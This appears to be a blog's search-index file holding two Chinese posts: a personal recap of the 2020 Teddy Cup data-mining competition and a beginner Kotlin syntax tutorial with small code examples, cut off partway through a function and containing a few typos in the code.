<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020泰迪杯数据挖掘挑战赛总结（A题）</title>
    <url>/2020/05/21/2020%E6%B3%B0%E8%BF%AA%E6%9D%AF%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%8C%91%E6%88%98%E8%B5%9B%E6%80%BB%E7%BB%93%EF%BC%88A%E9%A2%98%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>写在开始：转眼间，泰迪杯数据挖掘挑战赛已经过去了10多天，趁着结果还没出来，还有这股热乎劲，写篇文章总结下。</p>
</blockquote>
<h1 id="最初"><a href="#最初" class="headerlink" title="最初"></a>最初</h1><ul>
<li>最初的参赛原因简单粗暴。<br><img src="https://img-blog.csdnimg.cn/20200521143142625.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>后来也渐渐发现，白嫖也的确学到不少。</li>
<li>刚开始组队，选好队友很重要，和我组队的两个队员是两个数学学院的大佬。他们每个人都对比赛特别上心。组长也及其负责，这对我们后来的讨论，学习，解题有了很大的鼓励。</li>
</ul>
<h1 id="学习阶段"><a href="#学习阶段" class="headerlink" title="学习阶段"></a>学习阶段</h1><ul>
<li>在学习阶段是比赛整个阶段中对自我提升最大的阶段。那段时间真的是我整个学期学习最认真的时间，除去上课时间，每天从早学到晚，学习数据分析和机器学习。你只有学的足够深才能在解题的时候有更多的思路，更好的思考。</li>
<li>一个组三个人，一个负责写论文，一个负责算法设计，一个负责编程，身为一个准程序员，我理所应当的成了负责编程的那个人。每天跟着教学视频敲代码成了我的日常工作，有道云笔记记了很多，这些都会成为往后的知识财富。正好我也是大数据专业，数据分析也是一项基本技能。</li>
<li>偶尔会开语音讨论近期进度和对题目的理解，我们组选的是看起来较难的A题。虽然A题看起来较难，但是A题最起码全是数据，没有对文字型或其他类型数据的处理，也会好做一些。</li>
<li>在学习阶段就要多学习，认真学。需要学的不仅是教程视频。还要尽量多的百度一些论文阅读，学习别人的思路。</li>
</ul>
<h1 id="解题阶段"><a href="#解题阶段" class="headerlink" title="解题阶段"></a>解题阶段</h1><ul>
<li>比赛的数据量基本上都特别大，所以运行起来就会特别慢，一般一个程序运行一个多小时都是有可能的。所以我专门为前段时间白嫖的阿里云服务器配置了Python3运行环境，用XShell远程管理，写好程序后rz上传到服务器，然后让服务器在后台运行程序，自己继续写下一部分。事实证明，这个方法很有效果，大大节省了我们运行程序的时间。</li>
<li>解题阶段要多讨论，多讨论，多讨论！不同的人对题目的理解可能不太一样。我在一开始的理解就偏离了团队的路线，后来在一次讨论中才发现并及时调整。</li>
<li>在解题中要实验多个模型，不能死追着一个模型不放，可能下一个模型就比这个模型要更好。</li>
<li>介绍一个比较好用的库pandas-profiling，可以一键生成漂亮的数据总体预览，也可以生成HTML文件。如果加在论文中，会比较好看。具体使用方法见<a href="https://blog.csdn.net/Andy_shenzl/article/details/81709409">点击直达</a></li>
<li>另外，代码记得写注释，文件名记得备注清楚，不然到最后整理代码的时候你能疯，别问我咋知道的。。。<h1 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h1></li>
<li>比赛结束，不论结果怎样，最起码在这个过程中我们学到了很多，这就足够了。借用我在比赛中说的一句话：参赛本来的目的就是学习，放平心态就好，得奖也好，得不了奖也罢，只要我们尽力了，在这个过程中学到东西了，那这个比赛参加的就有价值。坚持到底，就是胜利者！</li>
<li>最后祝那些参加了的和将要参加比赛的童鞋们取得好成绩，也希望我们组能够取得优异的成绩吧。</li>
<li>时间——2020年5月21日。</li>
</ul>
]]></content>
      <categories>
        <category>比赛</category>
        <category>随手记</category>
      </categories>
      <tags>
        <tag>随手记</tag>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin基础语法（上）</title>
    <url>/2020/06/02/Kotlin%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Kotlin基础语法（下）"><a href="#Kotlin基础语法（下）" class="headerlink" title="Kotlin基础语法（下）"></a><a href="https://lang186.blog.csdn.net/article/details/106930532">Kotlin基础语法（下）</a></h1><h1 id="Kotlin基础语法（上）"><a href="#Kotlin基础语法（上）" class="headerlink" title="Kotlin基础语法（上）"></a>Kotlin基础语法（上）</h1><h2 id="输出Hello-world"><a href="#输出Hello-world" class="headerlink" title="输出Hello world!!!"></a>输出Hello world!!!</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    println(<span class="string">&quot;Hello world!!!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="变量与输出"><a href="#变量与输出" class="headerlink" title="变量与输出"></a>变量与输出</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name:String = <span class="string">&quot;张三&quot;</span>   <span class="comment">//定义字符串类型</span></span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>          <span class="comment">//自动判断类型为字符串（智能类型推断           ）</span></span><br><span class="line">    <span class="keyword">var</span> age = <span class="number">20</span>   <span class="comment">//定义整型</span></span><br><span class="line">    name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">    <span class="keyword">var</span> aInt:<span class="built_in">Int</span> = <span class="number">0</span>boo11 <span class="comment">//二进制方式赋值</span></span><br><span class="line">    println(<span class="string">&quot;aInt的值：&quot;</span>+aInt)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="kotlin常见数据类型"><a href="#kotlin常见数据类型" class="headerlink" title="kotlin常见数据类型"></a>kotlin常见数据类型</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTI1NTYyNy8yMDE4MDMvMTI1NTYyNy0yMDE4MDMwNDIzMjc0Njc2Ny0xMDE3OTI1MTE4LnBuZw?x-oss-process=image/format,png" alt="kotlin常见数据类型"></p>
<h2 id="变量的取值范围"><a href="#变量的取值范围" class="headerlink" title="变量的取值范围"></a>变量的取值范围</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">val</span> along:<span class="built_in">Long</span> = <span class="built_in">Long</span>.MAX_VALUE     <span class="comment">//判断long型取值范围</span></span><br><span class="line">    <span class="keyword">val</span> blong:<span class="built_in">Long</span> = <span class="built_in">Long</span>.MIN_VALUE</span><br><span class="line">    println(along)</span><br><span class="line">    println(blong)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="kotlin函数"><a href="#kotlin函数" class="headerlink" title="kotlin函数"></a>kotlin函数</h2><ul>
<li>实例：打印菱形<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    print1star()</span><br><span class="line">    print3star()</span><br><span class="line">    print5star()</span><br><span class="line">    print3star()</span><br><span class="line">    print1star()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">print1star</span><span class="params">()</span></span>&#123;</span><br><span class="line">    println(<span class="string">&quot;  *&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">print3star</span><span class="params">()</span></span>&#123;</span><br><span class="line">    println(<span class="string">&quot; ***&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">print5star</span><span class="params">()</span></span>&#123;</span><br><span class="line">    println(<span class="string">&quot;*****&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="kotlin布尔类型"><a href="#kotlin布尔类型" class="headerlink" title="kotlin布尔类型"></a>kotlin布尔类型</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num1 = <span class="number">2</span></span><br><span class="line">    <span class="keyword">var</span> num2 = <span class="number">3</span></span><br><span class="line">    println(num1&lt;num2)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> num3 = Math.sqrt(<span class="number">5.0</span>) - Math.sqrt(<span class="number">4.0</span>)      <span class="comment">//根号运算</span></span><br><span class="line">    <span class="keyword">var</span> num4 = Math.sqrt(<span class="number">4.0</span>) - Math.sqrt(<span class="number">3.0</span>)</span><br><span class="line">    println(num3&lt;num4)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> num5 = Math.pow(<span class="number">2.0</span>,<span class="number">100.0</span>)      <span class="comment">//幂运算</span></span><br><span class="line">    <span class="keyword">var</span> num6 = Math.pow(<span class="number">3.0</span>,<span class="number">75.0</span>)</span><br><span class="line">    println(num5&lt;num6)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="kotlin命令行交互式编程"><a href="#kotlin命令行交互式编程" class="headerlink" title="kotlin命令行交互式编程"></a>kotlin命令行交互式编程</h2><ul>
<li>配置好环境变量后命令行输入kotlinc进入，:quit退出</li>
</ul>
<h2 id="函数加强"><a href="#函数加强" class="headerlink" title="函数加强"></a>函数加强</h2><h3 id="kotlin函数规则"><a href="#kotlin函数规则" class="headerlink" title="kotlin函数规则"></a>kotlin函数规则</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> 函数名<span class="params">(参数名:参数类型)</span></span>:返回值类型&#123;</span><br><span class="line">    函数体</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>:<span class="built_in">Unit</span>&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实例：计算器"><a href="#实例：计算器" class="headerlink" title="实例：计算器"></a>实例：计算器</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">8</span></span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    println(<span class="string">&quot;a+b&quot;</span>+add(a,b))</span><br><span class="line">    println(<span class="string">&quot;a-b&quot;</span>+sub(a,b))</span><br><span class="line">    println(<span class="string">&quot;a*b&quot;</span>+mutl(a,b))</span><br><span class="line">    println(<span class="string">&quot;a/b&quot;</span>+devide(a,b))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">add</span><span class="params">(a:<span class="type">Int</span>, b:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">sub</span><span class="params">(a:<span class="type">Int</span>, b:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">mutl</span><span class="params">(a:<span class="type">Int</span>, b:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a*b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">devide</span><span class="params">(a:<span class="type">Int</span>, b:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a/b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="字符串模板"><a href="#字符串模板" class="headerlink" title="字符串模板"></a>字符串模板</h2><ul>
<li>实例：日记模板<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">diaryGenerater</span><span class="params">(placeName:<span class="type">String</span>)</span></span>:String&#123;</span><br><span class="line">    <span class="keyword">var</span> temple = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    今天天气晴朗，万里无云，我们去<span class="subst">$&#123;placeName&#125;</span>游玩，</span></span><br><span class="line"><span class="string">    首先映入眼帘的是<span class="subst">$&#123;placeName&#125;</span><span class="subst">$&#123;placeName.length&#125;</span>个镏金大字</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return temple</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fun main(args:Array&lt;String&gt;)&#123;</span></span><br><span class="line"><span class="string">    println(diaryGenerater(&quot;中山公园&quot;)) </span></span><br><span class="line"><span class="string">    //输出结果：今天天气晴朗，万里无云，我们去中山公园游玩，</span></span><br><span class="line"><span class="string">    首先映入眼帘的是中山公园4个镏金大字</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="条件控制if…else…"><a href="#条件控制if…else…" class="headerlink" title="条件控制if…else…"></a>条件控制if…else…</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">checkFace</span><span class="params">(score:<span class="type">Int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">80</span>)&#123;</span><br><span class="line">        println(<span class="string">&quot;这是一个帅哥&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;这是一个衰哥&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>也可以写到一行<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">80</span>) println(<span class="string">&quot;这是一个帅哥&quot;</span>) <span class="keyword">else</span> println(<span class="string">&quot;这是一个衰哥&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li>返回两个数中较大的那个<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">returnMax</span><span class="params">(a:<span class="type">Int</span>,b:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b) <span class="keyword">return</span> a <span class="keyword">else</span> <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str1 = <span class="string">&quot;Andy&quot;</span></span><br><span class="line">    <span class="keyword">var</span> str2 = <span class="string">&quot;andy&quot;</span></span><br><span class="line">    <span class="keyword">var</span> str3 = <span class="string">&quot;Andy&quot;</span></span><br><span class="line">    </span><br><span class="line">    println(str1==str2)     <span class="comment">//flase</span></span><br><span class="line">    println(str1==str3)   <span class="comment">//true,kotlin中“==”类似Java中的equals</span></span><br><span class="line">    </span><br><span class="line">    println(str1.equals(str2,<span class="literal">true</span>)) <span class="comment">//true,equals第二个参数表示忽略大小写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="kotlin空值处理"><a href="#kotlin空值处理" class="headerlink" title="kotlin空值处理"></a>kotlin空值处理</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">heat</span><span class="params">(str:<span class="type">String</span>?)</span></span>:String&#123;    <span class="comment">//不加?方法接收一个非空字符串，加?表示该参数可以为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;热&quot;</span>+str</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result1 = <span class="string">&quot;水&quot;</span></span><br><span class="line">    println(heat(result1))  <span class="comment">//“热水”</span></span><br><span class="line">    </span><br><span class="line">    println(heat(<span class="literal">null</span>))  <span class="comment">//无“？”，传null报错</span></span><br><span class="line">    println(heat(<span class="literal">null</span>)) <span class="comment">//有“？”，输出热null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="kotlin的when表达式"><a href="#kotlin的when表达式" class="headerlink" title="kotlin的when表达式"></a>kotlin的when表达式</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需求：10分满分，9分干得不错，8分还可以，7分还需努力，6分刚及格，其他需要加油</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">gradeStudent</span><span class="params">(score:<span class="type">Int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">when</span>(score)&#123;</span><br><span class="line">        <span class="number">10</span> -&gt; println(<span class="string">&quot;满分&quot;</span>)</span><br><span class="line">        <span class="number">9</span> -&gt; println(<span class="string">&quot;干得不错&quot;</span>)</span><br><span class="line">        <span class="number">8</span> -&gt; println(<span class="string">&quot;还可以&quot;</span>)</span><br><span class="line">        <span class="number">7</span> -&gt; println(<span class="string">&quot;还需努力&quot;</span>)</span><br><span class="line">        <span class="number">6</span> -&gt; println(<span class="string">&quot;刚及格&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span> -&gt; println(<span class="string">&quot;还需要加油&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    gradeStudent(<span class="number">7</span>)     <span class="comment">//还需努力</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>实例：完善日记模板<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">diaryGenerater</span><span class="params">(placeName:<span class="type">String</span>)</span></span>:String&#123;</span><br><span class="line">    <span class="keyword">var</span> temple = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    今天天气晴朗，万里无云，我们去<span class="subst">$&#123;placeName&#125;</span>游玩，</span></span><br><span class="line"><span class="string">    首先映入眼帘的是<span class="subst">$&#123;placeName&#125;</span><span class="subst">$&#123;numToChinese(placeName.length)&#125;</span>个镏金大字</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return temple</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fun numToChinese(num:Int):String&#123;</span></span><br><span class="line"><span class="string">    var result = when(num)&#123;</span></span><br><span class="line"><span class="string">        1 -&gt; &quot;一&quot;</span></span><br><span class="line"><span class="string">        2 -&gt; &quot;二&quot;</span></span><br><span class="line"><span class="string">        3 -&gt; &quot;三&quot;</span></span><br><span class="line"><span class="string">        4 -&gt; &quot;四&quot;</span></span><br><span class="line"><span class="string">        5 -&gt; &quot;五&quot;</span></span><br><span class="line"><span class="string">        6 -&gt; &quot;六&quot;</span></span><br><span class="line"><span class="string">        else -&gt; &quot;好几个&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fun main(args:Array&lt;String&gt;)&#123;</span></span><br><span class="line"><span class="string">    println(diaryGenerater(&quot;中山公园&quot;)) </span></span><br><span class="line"><span class="string">    //输出结果：今天天气晴朗，万里无云，我们去中山公园游玩，</span></span><br><span class="line"><span class="string">    首先映入眼帘的是中山公园四个镏金大字</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="kotlin的loop和Range"><a href="#kotlin的loop和Range" class="headerlink" title="kotlin的loop和Range"></a>kotlin的loop和Range</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nums = <span class="number">1</span> .. <span class="number">100</span>    <span class="comment">//表示构造从1到100的数组[1,100]</span></span><br><span class="line">    <span class="keyword">var</span> nums2 = <span class="number">1</span> until <span class="number">100</span> <span class="comment">//表示从1到99 [1,100)</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(num <span class="keyword">in</span> nums)&#123;</span><br><span class="line">        result = result+num</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">&quot;结果：<span class="subst">$&#123;result&#125;</span>&quot;</span>)  <span class="comment">//结果：5050</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//步长</span></span><br><span class="line">    <span class="keyword">var</span> nums2 = <span class="number">1</span> .. <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span>(num <span class="keyword">in</span> nums2 step <span class="number">2</span>)&#123;   <span class="comment">//步长为2</span></span><br><span class="line">        println(num)    <span class="comment">//输出1,3,5,7....</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//反转</span></span><br><span class="line">    <span class="keyword">var</span> num3 = nums2.reversed()</span><br><span class="line">        <span class="keyword">for</span>(num <span class="keyword">in</span> nums3)&#123;   <span class="comment">//反转打印</span></span><br><span class="line">        println(num)    <span class="comment">//输出16，15，14....</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//数目</span></span><br><span class="line">    println(num3.count())   <span class="comment">//输出16表示有16个数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="kotlin的List和Map入门"><a href="#kotlin的List和Map入门" class="headerlink" title="kotlin的List和Map入门"></a>kotlin的List和Map入门</h2><ul>
<li>List<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> lists = listOf(<span class="string">&quot;买鸡蛋&quot;</span>,<span class="string">&quot;买大米&quot;</span>,<span class="string">&quot;买肉&quot;</span>)    <span class="comment">//构建list</span></span><br><span class="line">    <span class="keyword">for</span>(list <span class="keyword">in</span> lists)&#123;     <span class="comment">//打印值</span></span><br><span class="line">    println(list)       <span class="comment">//输出：买鸡蛋 买大米 买肉</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>((i,e) <span class="keyword">in</span> lists.withIndex())&#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="variable">$i</span> <span class="variable">$e</span>&quot;</span>)  <span class="comment">//输出：0 买鸡蛋    1 买大米    2 买肉</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>Map<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeMap</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> map = TreeMap&lt;String,String&gt;()</span><br><span class="line">    map[<span class="string">&quot;好&quot;</span>] = <span class="string">&quot;good&quot;</span></span><br><span class="line">    map[<span class="string">&quot;学习&quot;</span>] = <span class="string">&quot;Study&quot;</span></span><br><span class="line">    map[<span class="string">&quot;天&quot;</span>] = <span class="string">&quot;day&quot;</span></span><br><span class="line">    map[<span class="string">&quot;向上&quot;</span>] = <span class="string">&quot;up&quot;</span></span><br><span class="line">    </span><br><span class="line">    println(map[<span class="string">&quot;好&quot;</span>]+<span class="string">&quot; &quot;</span>+map[<span class="string">&quot;好&quot;</span>]+<span class="string">&quot; &quot;</span>+map[<span class="string">&quot;学习&quot;</span>])</span><br><span class="line">    println(map[<span class="string">&quot;天&quot;</span>]+<span class="string">&quot; &quot;</span>+map[<span class="string">&quot;天&quot;</span>]+<span class="string">&quot; &quot;</span>+map[<span class="string">&quot;向上&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//输出结果：</span></span><br><span class="line">    <span class="comment">//good good study</span></span><br><span class="line">    <span class="comment">//day day up</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="函数和函数式表达式"><a href="#函数和函数式表达式" class="headerlink" title="函数和函数式表达式"></a>函数和函数式表达式</h2><ul>
<li>如果函数的函数体只有一句，那么可以省略大括号，如果有返回值，可以如下书写<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    println(add(<span class="number">5</span>,<span class="number">3</span>))   <span class="comment">//输出8</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">add</span><span class="params">(x:<span class="type">Int</span>,y:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span> = x+y</span><br></pre></td></tr></table></figure></li>
<li>函数表达式<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = &#123;x:<span class="built_in">Int</span>,y:<span class="built_in">Int</span> -&gt; x+y&#125;    <span class="comment">//此时i被声明为为一个函数表达式</span></span><br><span class="line">    println(i(<span class="number">3</span>,<span class="number">5</span>)) <span class="comment">//输出8</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> j:(<span class="built_in">Int</span>,<span class="built_in">Int</span>)-&gt;<span class="built_in">Int</span> = &#123;x,y -&gt; x+y&#125; <span class="comment">//另一种编写方式</span></span><br><span class="line">    println(j(<span class="number">3</span>,<span class="number">5</span>)) <span class="comment">//输出8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="Kotlin默认参数和具名参数"><a href="#Kotlin默认参数和具名参数" class="headerlink" title="Kotlin默认参数和具名参数"></a>Kotlin默认参数和具名参数</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeMap</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> Pi = <span class="number">3.1415926f</span>         <span class="comment">//val类似java中的final</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> area = 获取长方形面积(<span class="number">3</span>,<span class="number">2</span>)</span><br><span class="line">    println(area)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> area2 = 获取圆的周长(半径 = <span class="number">2.0f</span>)   <span class="comment">//由于第一个参数是具名参数，所以需要指定：第二个参数名 = 值</span></span><br><span class="line">    println(area2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> 获取长方形面积<span class="params">(长:<span class="type">Int</span>,宽:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 长*宽</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> 获取圆的周长<span class="params">(PI:<span class="type">Float</span> = Pi,半径:<span class="type">Float</span>)</span></span>:<span class="built_in">Float</span>&#123;   <span class="comment">//PI:Float = Pi 指定第一个参数为具名参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*PI*半径</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> 获取圆的周长2<span class="params">(PI:<span class="type">Float</span> = 